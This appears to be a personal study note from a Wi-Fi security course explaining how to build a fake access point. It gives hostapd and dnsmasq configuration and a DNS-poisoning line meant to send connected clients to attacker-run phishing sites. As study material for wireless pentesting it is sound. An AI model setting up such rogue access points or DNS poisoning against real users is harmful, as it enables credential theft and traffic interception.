---
aliases:
  - fake AP
  - fake access point
---
# Fake Access Point
A fake access point mimics a legitimate wi-fi network AP, including its *captive portal*. You can use tools like [`hostapd`](https://wireless.docs.kernel.org/en/latest/en/users/documentation/hostapd.html) and [`dnsmasq`](https://dnsmasq.org/doc.html) for this.
## Set up
#### 1. Create config file for `hostapd`
Create the following config file named `/etc/hostapd/hostapd.conf`:
```bash
interface=wlan0
ssid=FakeOpenNetwork
channel=6
```
- `ssid`: sets the SSID of the fake AP, should probably mimic the AP you're trying to capture clients on
#### 2. Configure DHCP server
Next you can use `dnsmasq` to configure the [DHCP](../../../networking/protocols/DHCP.md) server. Modify the `/etc/dnsmasq.conf` file:
```bash
interface=wlan0
dhcp-range=192.168.1.50,192.168.1.150,12h
```
#### 3. Poison DNS queries
Once clients connect to the fake AP, you can poison DNS queries by using `dnsmasq`. You can use this to redirect them to fraudulent websites created by you to phish credentials, etc. To do that, just add the following line to `/etc/dnsmasq.conf` (with the address set to the address you want to poison, and the IP set to an IP you control where the fraudulent site will be):
```bash
address=/example.com/192.168.1.100
```

> [!Resources]
> - [hostapd: Linux Wireless documentation](https://wireless.docs.kernel.org/en/latest/en/users/documentation/hostapd.html)
> - [Dnsmasq - network services for small networks.](https://dnsmasq.org/doc.html)
> - [Wifi Challenge Academy](https://academy.wifichallenge.com/courses/take/certified-wifichallenge-professional-cwp/texts/57442980-introduction)
> - My [own notes](https://github.com/trshpuppy/obsidian-notes) linked throughout the text.

